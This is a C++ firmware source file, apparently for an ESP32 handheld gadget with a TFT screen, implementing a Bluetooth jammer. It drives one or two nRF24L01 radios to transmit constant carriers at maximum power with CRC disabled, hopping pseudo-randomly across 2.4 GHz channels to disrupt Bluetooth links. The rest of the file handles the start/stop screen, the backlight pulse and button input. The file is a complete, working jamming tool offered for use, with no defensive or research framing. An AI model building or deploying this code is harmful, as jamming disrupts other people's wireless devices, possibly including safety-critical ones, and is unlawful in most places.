#include "bt_jammer.h"

#include <esp_system.h>
#include <RF24.h>
#include <SPI.h>

#include "DisplayTFT.h"
#include "Input.h"
#include "PepeDraw.h"
#include "Pins.h"

extern DisplayTFT tft;

#ifndef BT_JAMMER_DUAL_NRF
#define BT_JAMMER_DUAL_NRF 1
#endif

#ifndef BT_JAMMER_SPI_SPEED
#define BT_JAMMER_SPI_SPEED 8000000
#endif

#if NRF2_ENABLED && BT_JAMMER_DUAL_NRF
#define BT_JAMMER_RADIO_COUNT 2
#else
#define BT_JAMMER_RADIO_COUNT 1
#endif

static RF24 btJam1(NRF1_CE_PIN, NRF1_CSN_PIN, BT_JAMMER_SPI_SPEED);
static RF24 btJam2(NRF2_CE_PIN, NRF2_CSN_PIN, BT_JAMMER_SPI_SPEED);
static bool btJam1Ok = false;
static bool btJam2Ok = false;
static bool isBtJamming = false;
static bool exitRequested = false;
static uint8_t btFrame = 0;
static bool backlightPwmActive = false;
static uint8_t btSweepIndex = 0;
static uint8_t btCh1 = 2;
static uint8_t btCh2 = 41;

static constexpr int BT_BL_LEDC_CHANNEL = 7;
static constexpr int BT_BL_LEDC_FREQ = 5000;
static constexpr int BT_BL_LEDC_RESOLUTION = 8;
static constexpr uint8_t BT_BL_MIN_DUTY = 165;
static constexpr uint8_t BT_BL_MAX_DUTY = 255;
static constexpr unsigned long BT_BL_PULSE_MS = 1300;

static constexpr uint8_t BT_MIN_RF_CHANNEL = 2;
static constexpr uint8_t BT_MAX_RF_CHANNEL = 80;
static constexpr uint8_t BT_RF_CHANNEL_COUNT =
    BT_MAX_RF_CHANNEL - BT_MIN_RF_CHANNEL + 1;
static constexpr uint8_t BT_SWEEP_STEP = 37;
static constexpr uint8_t BT_RADIO_OFFSET = 39;
static constexpr uint16_t BT_MIN_DWELL_US = 130;
static constexpr uint16_t BT_MAX_DWELL_US = 170;

static void configureBtRadio(RF24& radio) {
    radio.powerUp();
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(32);
    radio.setAddressWidth(5);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
}

static int activeBtRadioCount() {
    return (btJam1Ok ? 1 : 0) + (btJam2Ok ? 1 : 0);
}

static void drawBtScreen();

static void resetBtSweep() {
    btSweepIndex = 0;
    btCh1 = BT_MIN_RF_CHANNEL;
    btCh2 = BT_MIN_RF_CHANNEL + BT_RADIO_OFFSET;
}

static void advanceBtSweep() {
    btSweepIndex = (btSweepIndex + BT_SWEEP_STEP) % BT_RF_CHANNEL_COUNT;
    btCh1 = BT_MIN_RF_CHANNEL + btSweepIndex;
    btCh2 = BT_MIN_RF_CHANNEL +
        ((btSweepIndex + BT_RADIO_OFFSET) % BT_RF_CHANNEL_COUNT);

    if (btJam1Ok) btJam1.setChannel(btCh1);
    if (btJam2Ok) btJam2.setChannel(btCh2);

    delayMicroseconds(random(BT_MIN_DWELL_US, BT_MAX_DWELL_US + 1));
}

static void prepareBtDisplay() {
    pinMode(TFT_CS_PIN, OUTPUT);
    pinMode(NRF1_CSN_PIN, OUTPUT);
#if NRF2_ENABLED
    pinMode(NRF2_CSN_PIN, OUTPUT);
#endif
    pinMode(NRF1_CE_PIN, OUTPUT);
#if NRF2_ENABLED
    pinMode(NRF2_CE_PIN, OUTPUT);
#endif

    if (!isBtJamming) {
        digitalWrite(NRF1_CE_PIN, LOW);
#if NRF2_ENABLED
        digitalWrite(NRF2_CE_PIN, LOW);
#endif
    }
    digitalWrite(NRF1_CSN_PIN, HIGH);
#if NRF2_ENABLED
    digitalWrite(NRF2_CSN_PIN, HIGH);
#endif
    digitalWrite(TFT_CS_PIN, HIGH);
    delayMicroseconds(80);
}

static void clearBtScreen() {
    prepareBtDisplay();
    tft.fillScreen(TFT_BLACK);
    delay(12);
    tft.fillRect(0, 0, 320, 240, TFT_BLACK);
}

static void beginBacklightPulse() {
#if TFT_LED_PIN >= 0
    if (!backlightPwmActive) {
        ledcSetup(BT_BL_LEDC_CHANNEL, BT_BL_LEDC_FREQ, BT_BL_LEDC_RESOLUTION);
        ledcAttachPin(TFT_LED_PIN, BT_BL_LEDC_CHANNEL);
        backlightPwmActive = true;
    }
    ledcWrite(BT_BL_LEDC_CHANNEL, BT_BL_MAX_DUTY);
#endif
}

static void updateBacklightPulse() {
#if TFT_LED_PIN >= 0
    if (!backlightPwmActive) return;

    unsigned long phase = millis() % BT_BL_PULSE_MS;
    unsigned long half = BT_BL_PULSE_MS / 2;
    unsigned long ramp = (phase < half) ? phase : (BT_BL_PULSE_MS - phase);
    uint8_t duty = BT_BL_MIN_DUTY +
        ((BT_BL_MAX_DUTY - BT_BL_MIN_DUTY) * ramp) / half;
    ledcWrite(BT_BL_LEDC_CHANNEL, duty);
#endif
}

static void restoreBacklight() {
#if TFT_LED_PIN >= 0
    if (backlightPwmActive) {
        ledcWrite(BT_BL_LEDC_CHANNEL, BT_BL_MAX_DUTY);
        ledcDetachPin(TFT_LED_PIN);
        backlightPwmActive = false;
    }
    pinMode(TFT_LED_PIN, OUTPUT);
    digitalWrite(TFT_LED_PIN, HIGH);
#endif
}

static void startBtJammer() {
    isBtJamming = true;
    resetBtSweep();

    // Draw before enabling carriers so the TFT does not steal SPI time mid-attack.
    drawBtScreen();
    beginBacklightPulse();

    if (btJam1Ok) {
        configureBtRadio(btJam1);
        btJam1.startConstCarrier(RF24_PA_MAX, btCh1);
    }
    if (btJam2Ok) {
        configureBtRadio(btJam2);
        btJam2.startConstCarrier(RF24_PA_MAX, btCh2);
    }
    delay(400);
}

static void stopBtJammer() {
    isBtJamming = false;
    if (btJam1Ok) btJam1.stopConstCarrier();
    if (btJam2Ok) btJam2.stopConstCarrier();
    restoreBacklight();
}

static void drawBtGlyph(int x, int y, uint8_t frame) {
    tft.drawLine(x + 16, y + 4, x + 16, y + 52, TFT_CYAN);
    tft.drawLine(x + 16, y + 4, x + 36, y + 16, TFT_CYAN);
    tft.drawLine(x + 36, y + 16, x + 16, y + 28, TFT_CYAN);
    tft.drawLine(x + 16, y + 28, x + 36, y + 40, TFT_CYAN);
    tft.drawLine(x + 36, y + 40, x + 16, y + 52, TFT_CYAN);
    tft.drawLine(x + 4, y + 16, x + 48, y + 44, TFT_WHITE);
    tft.drawLine(x + 4, y + 40, x + 48, y + 12, TFT_WHITE);
    if ((frame / 4) % 2 == 0) {
        tft.drawCircle(x + 16, y + 28, 26, TFT_BLUE);
        tft.drawCircle(x + 16, y + 28, 32, TFT_CYAN);
    }
}

static void drawBtScreen() {
    uint8_t frame = btFrame++;
    clearBtScreen();
    tft.drawRect(0, 0, 320, 240, TFT_WHITE);
    tft.fillRect(1, 1, 318, 36, isBtJamming ? TFT_BLUE : TFT_WHITE);
    drawStringBig(10, 10, "BT JAMMER", isBtJamming ? TFT_WHITE : TFT_BLACK, 1);
    drawStringRight(306, 14, isBtJamming ? "ON" : "READY",
                    isBtJamming ? TFT_WHITE : TFT_BLACK, 1);
    tft.drawFastHLine(0, 36, 320, TFT_WHITE);

    drawBtGlyph(24, 68, frame);

    drawStringBig(112, 64, isBtJamming ? "MODO MAX" : "ESPECTRO", TFT_WHITE, 1);
    drawStringCustom(114, 88, isBtJamming ? "HOPPING 2.4GHz" : "BT LISTO",
                     isBtJamming ? TFT_RED : TFT_GREEN, 2);
    drawStringCustom(114, 116, "RADIOS: " + String(activeBtRadioCount()) + "/" + String(BT_JAMMER_RADIO_COUNT),
                     activeBtRadioCount() > 0 ? TFT_GREEN : TFT_RED, 1);
    if (isBtJamming) {
        drawStringCustom(114, 132, "CH: " + String(btCh1) + "/" + String(btCh2),
                         TFT_CYAN, 1);
    }

    if (isBtJamming) {
        tft.fillRect(18, 140, 284, 58, TFT_BLACK);
        for (int i = 0; i < 18; i++) {
            int h = 5 + ((frame + i * 3) % 45);
            uint16_t c = (i % 3 == 0) ? TFT_CYAN : TFT_BLUE;
            tft.fillRect(26 + i * 15, 192 - h, 8, h, c);
        }
    } else {
        tft.drawRect(112, 148, 152, 28, TFT_WHITE);
        drawStringCustom(126, 157, "OK: START", TFT_GREEN, 2);
    }

    tft.drawFastHLine(0, 214, 320, TFT_WHITE);
    drawStringCustom(8, 222, "OK: TOGGLE", TFT_WHITE, 1);
    drawStringRight(312, 222, "BACK/OK(H): BACK", TFT_WHITE, 1);
}

void btJammerSetup() {
    randomSeed(esp_random());

    pinMode(TFT_CS_PIN, OUTPUT);
    digitalWrite(TFT_CS_PIN, HIGH);
    pinMode(NRF1_CSN_PIN, OUTPUT);
    digitalWrite(NRF1_CSN_PIN, HIGH);
#if NRF2_ENABLED
    pinMode(NRF2_CSN_PIN, OUTPUT);
    digitalWrite(NRF2_CSN_PIN, HIGH);
#endif
    pinMode(NRF1_CE_PIN, OUTPUT);
    digitalWrite(NRF1_CE_PIN, LOW);
#if NRF2_ENABLED
    pinMode(NRF2_CE_PIN, OUTPUT);
    digitalWrite(NRF2_CE_PIN, LOW);
#endif

    SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN);
    delay(100);

    btJam1.begin();

#if NRF2_ENABLED && BT_JAMMER_DUAL_NRF
    btJam2.begin();
#else
    btJam2Ok = false;
#endif

    delay(500);

    bool btJam1BeginOk = btJam1.begin();
    btJam1Ok = btJam1BeginOk && btJam1.isChipConnected();
    if (btJam1Ok) configureBtRadio(btJam1);

#if NRF2_ENABLED && BT_JAMMER_DUAL_NRF
    bool btJam2BeginOk = btJam2.begin();
    btJam2Ok = btJam2BeginOk && btJam2.isChipConnected();
    if (btJam2Ok) configureBtRadio(btJam2);
#endif

    Serial.printf("[bt_jammer] NRF1 CE:%d CSN:%d -> %s\n",
                  NRF1_CE_PIN, NRF1_CSN_PIN, btJam1Ok ? "OK" : "FAIL");
#if NRF2_ENABLED && BT_JAMMER_DUAL_NRF
    Serial.printf("[bt_jammer] NRF2 CE:%d CSN:%d -> %s\n",
                  NRF2_CE_PIN, NRF2_CSN_PIN, btJam2Ok ? "OK" : "FAIL");
#else
    Serial.println("[bt_jammer] NRF2 disabled for stable BT mode");
#endif

    prepareBtDisplay();
}

void btJammerLoop() {
    if (isBackPressed()) {
        stopBtJammer();
        exitRequested = true;
        while (isBackPressed()) delay(5);
        flushNavInput(60);
        return;
    }

    if (isEnterPressed()) {
        bool held = waitOkReleaseWasLong();
        if (held) {
            stopBtJammer();
            exitRequested = true;
            flushNavInput(60);
            return;
        }

        isBtJamming = !isBtJamming;
        if (isBtJamming) {
            startBtJammer();
        } else {
            stopBtJammer();
            drawBtScreen();
        }
        delay(250);
    }

    if (isBtJamming) {
        for (uint8_t i = 0; i < BT_RF_CHANNEL_COUNT; i++) {
            if (!isBtJamming) break;
            advanceBtSweep();

            if (isEnterPressed() || isBackPressed()) {
                stopBtJammer();
                drawBtScreen();
                while (isEnterPressed() || isBackPressed()) delay(5);
                flushNavInput(60);
                delay(120);
                break;
            }
        }

        updateBacklightPulse();
    }
}

void runBTJammer() {
    while (isEnterPressed() || isBackPressed()) delay(5);
    delay(100);

    btJammerSetup();
    exitRequested = false;
    drawBtScreen();

    if (activeBtRadioCount() == 0) {
        drawStringCentered(112, "NRF24 ERROR", TFT_RED, 2, FONT_BIG);
        drawStringCentered(150, "Revisa CE/CSN/SPI", TFT_WHITE, 1, FONT_SMALL);
        delay(2500);
        clearBtScreen();
        flushNavInput(80);
        return;
    }

    while (!exitRequested) {
        btJammerLoop();
        if (isBtJamming) yield();
        else delay(5);
    }

    stopBtJammer();
    if (btJam1Ok) btJam1.powerDown();
    if (btJam2Ok) btJam2.powerDown();
    clearBtScreen();
    while (isEnterPressed() || isBackPressed()) delay(5);
    flushNavInput(80);
}
